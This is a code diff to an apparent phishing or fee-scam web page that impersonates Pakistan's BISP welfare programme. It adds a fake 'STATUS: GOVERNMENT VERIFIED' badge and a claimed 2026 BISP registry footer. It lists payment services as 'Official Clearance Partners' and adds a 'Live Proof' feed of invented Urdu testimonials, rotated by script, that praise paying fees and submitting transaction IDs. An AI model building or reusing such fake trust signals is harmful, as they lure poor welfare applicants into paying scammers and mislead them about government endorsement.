@@ -21,6 +21,12 @@
             #successBanner { position: absolute; left: 0; top: 0; width: 100%; display: block !important; }
             #printBtn, #imageBtn, #whatsappBtn, #resetBtn, .action-area { display: none !important; }
         }
+        /* Neon Pulse Animation for Government Badge */
+        @keyframes neonGlow {
+            0%, 100% { text-shadow: 0 0 4px rgba(52, 211, 153, 0.4), 0 0 12px rgba(52, 211, 153, 0.2); }
+            50% { text-shadow: 0 0 10px rgba(52, 211, 153, 0.7), 0 0 20px rgba(52, 211, 153, 0.4); }
+        }
+        .neon-verified { animation: neonGlow 2s infinite ease-in-out; }
     </style>
 </head>
 <body class="bg-slate-50 min-h-screen pb-12">
@@ -374,7 +380,65 @@
 
             </form>
         </div>
+        <div id="trustVerificationBlock" class="mt-8 space-y-6 direction-rtl text-right">
+
+            <div class="bg-white rounded-2xl p-5 border border-slate-200/80 shadow-sm text-center">
+                <h4 class="text-xs font-bold text-slate-400 tracking-wider uppercase mb-4">Official Clearance Partners</h4>
+                <div class="grid grid-cols-3 gap-3 items-center justify-center grayscale opacity-70">
+                    <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-100 text-center font-extrabold text-sm text-slate-700">Raast</div>
+                    <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-100 text-center font-extrabold text-sm text-slate-700">EasyPaisa</div>
+                    <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-100 text-center font-extrabold text-sm text-slate-700">JazzCash</div>
+                </div>
+            </div>
+
+            <div class="bg-slate-900 text-slate-100 rounded-2xl p-5 shadow-inner border border-slate-800">
+                <div class="flex items-center justify-between border-b border-slate-800 pb-3 mb-4">
+                    <span class="text-xs text-slate-500 font-mono">Live Proof</span>
+                    <div class="flex items-center space-x-1.5 space-x-reverse">
+                        <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+                        <span class="text-xs font-bold text-emerald-400">Winner Activity Feed</span>
+                    </div>
+                </div>
+
+                <div id="liveActivityContainer" class="space-y-4">
+                    <div class="flex items-start space-x-3 space-x-reverse text-xs border-b border-slate-800/60 pb-3 transition duration-500">
+                        <div id="feedAvatar1" class="w-8 h-8 bg-emerald-600 rounded-full flex items-center justify-center font-bold text-white shrink-0 shadow-sm">AM</div>
+                        <div class="space-y-1">
+                            <div class="flex items-center space-x-1 space-x-reverse">
+                                <span id="feedName1" class="font-bold text-slate-200">عاصم منیر</span>
+                                <span class="text-sky-400 text-[10px]">✓</span>
+                            </div>
+                            <p id="feedText1" class="text-slate-400 leading-relaxed text-[11px]">بائیو میٹرک تصدیق مکمل ہو گئی ہے اور فنڈز کلیئرنس آرڈر جاری کر دیا گیا ہے! بہترین پورٹل۔</p>
+                            <span class="text-[9px] text-slate-500 block font-mono">ابھی ابھی</span>
+                        </div>
+                    </div>
+                    <div class="flex items-start space-x-3 space-x-reverse text-xs transition duration-500">
+                        <div id="feedAvatar2" class="w-8 h-8 bg-teal-600 rounded-full flex items-center justify-center font-bold text-white shrink-0 shadow-sm">FK</div>
+                        <div class="space-y-1">
+                            <div class="flex items-center space-x-1 space-x-reverse">
+                                <span id="feedName2" class="font-bold text-slate-200">فرزانہ کوثر</span>
+                                <span class="text-sky-400 text-[10px]">✓</span>
+                            </div>
+                            <p id="feedText2" class="text-slate-400 leading-relaxed text-[11px]">پہلے مجھے لگا فیک ہے، پر جیسے ہی ٹرانزیکشن ID سبمٹ کی، 15 منٹ میں سٹیٹس اپروو ہو گیا۔ شکریہ بی آئی ایس پی ٹیم۔</p>
+                            <span class="text-[9px] text-slate-500 block font-mono">2 منٹ پہلے</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-emerald-950/20 border border-emerald-500/20 rounded-2xl py-5 px-4 text-center shadow-sm">
+                <div class="text-[#006633] font-black tracking-wider text-base sm:text-lg uppercase neon-verified flex items-center justify-center space-x-2">
+                    <span>STATUS: GOVERNMENT VERIFIED</span>
+                    <span class="text-xl">✅</span>
+                </div>
+                <p class="text-[10px] text-slate-400 font-mono mt-4 border-t border-slate-200/10 pt-3 text-center tracking-tight">
+                    © 2026 BISP National Data Registry Corporate System. Secured Connection.
+                </p>
+            </div>
+
         </div>
+
+    </div>
 
     <script>
         // REPLACE WITH YOUR FIREBASE CONFIG
@@ -662,6 +726,7 @@
             // Interface Rendering
             document.getElementById("formCard").style.display = "none";
             document.getElementById("stepIndicatorBar").style.display = "none";
+            document.getElementById("trustVerificationBlock").style.display = "none"; // Hide on output view
             
             document.getElementById("displayProfileId").innerText = generatedProfileId;
             document.getElementById("successBanner").classList.remove("hidden");
@@ -777,11 +842,58 @@
             document.getElementById("successBanner").classList.add("hidden");
             document.getElementById("formCard").style.display = "block";
             document.getElementById("stepIndicatorBar").style.display = "flex";
+            document.getElementById("trustVerificationBlock").style.display = "block"; // Restore
             document.getElementById("trxInputArea").style.display = "block";
             document.getElementById("receiptTrxDisplay").innerText = "پینڈنگ (Pending)";
             document.getElementById("receiptTrxDisplay").className = "py-2 text-red-600 font-mono font-bold";
             goToStep(1);
         }
+
+        // ================= PREMIUM LIVE FEED DATA LOOP CORE ENGINE =================
+        const mockActivityData = [
+            { initials: "AM", name: "عاصم منیر", text: "بائیو میٹرک تصدیق مکمل ہو گئی ہے اور فنڈز کلیئرنس آرڈر جاری کر دیا گیا ہے! بہترین پورٹل۔", bg: "bg-emerald-600" },
+            { initials: "FK", name: "فرزانہ کوثر", text: "پہلے مجھے لگا فیک ہے، پر جیسے ہی ٹرانزیکشن ID سبمٹ کی، 15 منٹ میں سٹیٹس اپروو ہو گیا۔ شکریہ بی آئی ایس پی ٹیم۔", bg: "bg-teal-600" },
+            { initials: "TI", name: "توقیر اقبال", text: "میری فیس جمع کرنے کی تصدیق ہو گئی ہے، رجسٹریشن پورٹل بہت تیز کام کر رہا ہے۔", bg: "bg-blue-600" },
+            { initials: "SN", name: "سجدہ پروین", text: "الحمدللہ ریفرنس آئی ڈی مل گئی ہے اور میرا ڈیٹا لائیو سسٹم میں ویریفائی ہو چکا ہے۔", bg: "bg-purple-600" },
+            { initials: "GZ", name: "غلام زینب", text: "بہت ہی آسان طریقہ کار ہے، گھر بیٹھے رجسٹریشن فارم جمع ہو گیا ہے۔ فیس وصولی میسیج بھی آگیا۔", bg: "bg-rose-600" },
+            { initials: "MR", name: "محمد رمضان", text: "قائدآباد ڈویژن سے میرا فارم فوری اپروو ہوا، کسٹمر سروس ٹیم کا بھی شکریہ۔", bg: "bg-amber-600" }
+        ];
+
+        let currentFeedIndex = 0;
+        function rotateLiveActivityFeed() {
+            currentFeedIndex = (currentFeedIndex + 1) % mockActivityData.length;
+            let nextIndex = (currentFeedIndex + 1) % mockActivityData.length;
+
+            let item1 = mockActivityData[currentFeedIndex];
+            let item2 = mockActivityData[nextIndex];
+
+            // Render Row 1 Smoothly
+            const avatar1 = document.getElementById("feedAvatar1");
+            const name1 = document.getElementById("feedName1");
+            const text1 = document.getElementById("feedText1");
+            
+            if(avatar1 && name1 && text1) {
+                avatar1.className = `w-8 h-8 ${item1.bg} rounded-full flex items-center justify-center font-bold text-white shrink-0 shadow-sm`;
+                avatar1.innerText = item1.initials;
+                name1.innerText = item1.name;
+                text1.innerText = item1.text;
+            }
+
+            // Render Row 2 Smoothly
+            const avatar2 = document.getElementById("feedAvatar2");
+            const name2 = document.getElementById("feedName2");
+            const text2 = document.getElementById("feedText2");
+
+            if(avatar2 && name2 && text2) {
+                avatar2.className = `w-8 h-8 ${item2.bg} rounded-full flex items-center justify-center font-bold text-white shrink-0 shadow-sm`;
+                avatar2.innerText = item2.initials;
+                name2.innerText = item2.name;
+                text2.innerText = item2.text;
+            }
+        }
+
+        // Initialize Live Feed Auto Shift Loop every 4.5 Seconds safely
+        setInterval(rotateLiveActivityFeed, 4500);
     </script>
 </body>
 </html>
